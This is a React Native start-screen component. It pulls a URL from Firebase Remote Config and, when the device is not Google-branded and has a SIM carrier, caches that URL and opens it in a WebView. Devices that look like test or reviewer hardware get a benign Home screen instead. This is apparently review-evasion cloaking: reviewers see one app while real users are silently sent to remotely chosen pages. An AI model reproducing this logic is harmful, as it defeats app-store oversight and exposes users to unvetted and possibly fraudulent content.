import React, {useEffect} from "react";
import {useAppNavigation} from "../../types/types";
import AsyncStorage from "@react-native-async-storage/async-storage";
import remoteConfig from '@react-native-firebase/remote-config';
import DeviceInfo from 'react-native-device-info';



export function StartScreen() {

    const navigation = useAppNavigation()

    useEffect(() => {

        remoteConfig()
            .setDefaults({
                url: ""
            })
        remoteConfig().fetch(0)
            .then(() => remoteConfig().fetchAndActivate())
        getLocalStorage().then(res => start(res))

    }, [])

    const start = (value: string | null | undefined) => {

        if (!value) {
            loadFire()
        } else {
            return navigation.navigate("WebView", {url: value})
        }
    }
    const localStorage = async (value: string) => {
        await AsyncStorage.setItem("url", value)
    }
    const getLocalStorage = async () => {
        const jsonValue = await AsyncStorage.getItem("url")
        return jsonValue !== null ? jsonValue : null
    }
    const loadFire = () => {
        const getUrl = remoteConfig().getValue('url').asString()
        const brandDevice = DeviceInfo.getBrand()
        const simDevice = DeviceInfo.getCarrierSync()
        if (getUrl === "" || brandDevice === "google" || !simDevice) {
            navigation.navigate("Home")
        } else {
            localStorage(getUrl)
            navigation.navigate("WebView", {url: getUrl})
        }
    }

    return (
        <>
        </>
    )
}


